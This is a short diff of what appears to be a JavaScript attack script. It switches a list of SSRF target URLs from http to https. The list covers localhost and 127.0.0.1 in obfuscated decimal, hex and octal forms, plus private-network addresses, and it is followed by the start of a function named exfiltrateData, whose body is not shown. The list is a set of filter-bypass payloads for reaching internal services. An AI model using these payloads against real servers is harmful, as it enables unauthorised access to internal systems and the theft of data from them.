@@ -1,21 +1,21 @@
 const ipValues = [
-    "http://localhost/api.php",
-    "http://localhost:80/api.php",
-    "http://localhost:443/api.php",
-    "http://127.0.0.1/api.php",
-    "http://127.0.0.1:80/api.php",
-    "http://127.0.0.1:443/api.php",
-    "http://2130706433/api.php",          
-    "http://0x7F000001/api.php",          
-    "http://0177.0000.0000.0001/api.php",
-    "http://0/api.php",
-    "http://127.1/api.php",
-    "http://10.0.0.0/api.php",
-    "http://10.0.0.1/api.php",
-    "http://172.16.0.0/api.php",
-    "http://172.16.0.1/api.php",
-    "http://192.168.1.0/api.php",
-    "http://192.168.1.1/api.php"
+    "https://localhost/api.php",
+    "https://localhost:80/api.php",
+    "https://localhost:443/api.php",
+    "https://127.0.0.1/api.php",
+    "https://127.0.0.1:80/api.php",
+    "https://127.0.0.1:443/api.php",
+    "https://2130706433/api.php",          
+    "https://0x7F000001/api.php",          
+    "https://0177.0000.0000.0001/api.php",
+    "https://0/api.php",
+    "https://127.1/api.php",
+    "https://10.0.0.0/api.php",
+    "https://10.0.0.1/api.php",
+    "https://172.16.0.0/api.php",
+    "https://172.16.0.1/api.php",
+    "https://192.168.1.0/api.php",
+    "https://192.168.1.1/api.php"
 ];
 
 function exfiltrateData(data) {
